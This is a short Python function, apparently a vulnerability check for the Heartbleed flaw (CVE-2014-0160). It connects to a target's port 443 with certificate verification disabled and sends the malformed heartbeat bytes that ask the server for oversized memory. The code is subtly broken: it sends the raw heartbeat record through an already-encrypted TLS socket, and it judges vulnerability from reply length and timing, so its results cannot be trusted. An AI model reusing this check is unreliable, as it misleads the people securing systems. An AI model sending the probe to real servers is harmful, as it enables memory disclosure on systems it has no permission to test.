import socket
import ssl
import struct
import time

def check_cve_2014_0160(target_ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, 443))
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
        
        heartbeat = bytearray.fromhex('18 03 02 00 03 01 40 00')
        ssl_sock.send(heartbeat)
        
        start_time = time.time()
        response = ssl_sock.recv(4096)
        end_time = time.time()
        
        ssl_sock.close()
        
        if len(response) > 3 and end_time - start_time < 1.0:
            return True
        return False
        
    except Exception:
        return False
